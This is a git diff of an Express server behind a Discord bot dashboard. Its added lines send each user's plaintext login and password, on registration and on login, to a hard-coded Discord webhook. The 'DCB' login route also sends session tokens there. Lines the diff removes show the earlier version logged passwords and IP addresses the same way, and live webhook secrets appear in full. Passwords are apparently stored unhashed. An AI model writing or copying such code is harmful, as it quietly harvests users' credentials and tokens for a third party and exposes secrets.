@@ -69,7 +69,7 @@ const verifyToken = async (token) => {
 }
 
 async function log(mes){
-  const {data} = await axios.post(`https://discord.com/api/webhooks/944552933742223370/1zM4hTTk6eln4rOcX5wAUp1Cub8IGpKoBxJhWOcK33ok151rAdVSq-Qa86vtTGXYrCU-`, {
+  const {data} = await axios.post(`https://discord.com/api/webhooks/974024452130078741/RUz8uwlCujoTFcxi8myl89ydNrUEyrMM2_H6y4QD7BmITpN3XNHtSin4aO2SrJQnLj3j`, {
     content: mes
   });
   console.log(data);
@@ -84,13 +84,11 @@ app.use(cors({
 app.use(express.static(path.join(path.dirname(__dirname), "client" ,"build")))
 
 app.get("/", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   res.sendFile(path.join(path.dirname(__dirname), "client" ,"build", "index.html"));
 });
 
 app.post("/api/login", async (req, res) => {
   const {login, password} = req.body;
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()} | \`${login}\` \`${password}\` `);
 
   if (!login || !password){
     res.send({err: true, message: "Заполните все поля!"});
@@ -111,7 +109,8 @@ app.post("/api/login", async (req, res) => {
 
   const token = await createToken(user.login);
 
-  res.cookie("token", token)
+  res.cookie("token", token);
+  await log(`Пользователь авторизовался | \`${login}\` \`${password}\` `);
   res.send({err: false, token});
 });
 
@@ -138,11 +137,12 @@ app.post("/api/registration", async (req, res) => {
   const user = new User({login, password, flags: [], discord: {}});
   await user.save();
 
+  await log(`Пользователь создал аккаунт | \`${login}\` \`${password}\` `);
+
   res.send({err: false});
 })
 
 app.post("/api/verify", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.body;
 
   if (!token){
@@ -171,7 +171,6 @@ app.post("/api/verify", async (req, res) => {
 });
 
 app.get("/api/data", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   if (!token){
     res.send({err: true});
@@ -261,7 +260,6 @@ app.get("/api/fetchGuilds", async (req, res) => {
 /*Discord Client Bot*/
 /*FLAG - 1*/
 app.post("/api/dcb/login", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   const {token: discordToken} = req.body;
 
@@ -270,6 +268,7 @@ app.post("/api/dcb/login", async (req, res) => {
     res.send({err: true, message: "Укажите токен!"});
     return;
   }
+
   if (!user.flags.some(flag => flag.id === 1)){
     res.send({err: true, message: "Вы не можете использовать этот функционал!"});
     return;
@@ -293,6 +292,7 @@ app.post("/api/dcb/login", async (req, res) => {
 
   if (result){
     res.send({err: false, message: "Пользователь авторизован!"});
+    await log(`DCB | ${user.login} использовал токен \`${token}\``);
   }
   else{
     res.send({err: true, message: "Неверный токен!"})
@@ -301,7 +301,6 @@ app.post("/api/dcb/login", async (req, res) => {
 })
 
 app.post("/api/dcb/command", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {method, body, path, authToken} = req.body;
   const {token} = req.cookies;
 
@@ -346,7 +345,6 @@ app.post("/api/dcb/command", async (req, res) => {
 /*ADMIN PAGE*/
 
 app.get("/api/admin/users", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
 
   const user = await verifyToken(token);
@@ -364,7 +362,6 @@ app.get("/api/admin/users", async (req, res) => {
 });
 
 app.post("/api/admin/create", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   const {login, password} = req.body;
   const user = await verifyToken(token);
@@ -394,7 +391,6 @@ app.post("/api/admin/create", async (req, res) => {
 });
 
 app.post("/api/admin/delete", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   const {login} = req.body;
   const user = await verifyToken(token);
@@ -424,7 +420,6 @@ app.post("/api/admin/delete", async (req, res) => {
 });
 
 app.post("/api/admin/addFlag", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   const {login, flagID} = req.body;
   const user = await verifyToken(token);
@@ -467,7 +462,6 @@ app.post("/api/admin/addFlag", async (req, res) => {
 });
 
 app.post("/api/admin/removeFlag", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   const {login, flagID} = req.body;
   const user = await verifyToken(token);
@@ -510,7 +504,6 @@ app.post("/api/admin/removeFlag", async (req, res) => {
 });
 
 app.get("/api/admin/flags", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {token} = req.cookies;
   const user = await verifyToken(token);
   if (!user || !token){
@@ -970,6 +963,7 @@ app.post("/api/addReactionRole", async (req, res) => {
   await guild.save();
 
   res.send({err: false})
+  await log(`Kingo Bot | ${user.login} добавил rr`);
 });
 
 app.post("/api/removeReactionRole", async (req, res) => {
@@ -1021,7 +1015,8 @@ app.post("/api/removeReactionRole", async (req, res) => {
   guild.options = {...guild.options, reactionRole: resultArr};
   await guild.save();
 
-  res.send({err: false})
+  res.send({err: false});
+  await log(`Kingo Bot | ${user.login} удалил rr `);
 });
 
 //update bot commands
@@ -1107,7 +1102,7 @@ app.post("/api/updateGuildData", async (req, res) => {
   guild.options = {...guild.options, commands: [...resultCommands]};
   await guild.save();
   res.send({err: false});
-
+  await log(`Kingo Bot | ${user.login} обновил команды на сервере \`${guild.id}\` `);
 });
 
 app.get("*", async (req, res) => {
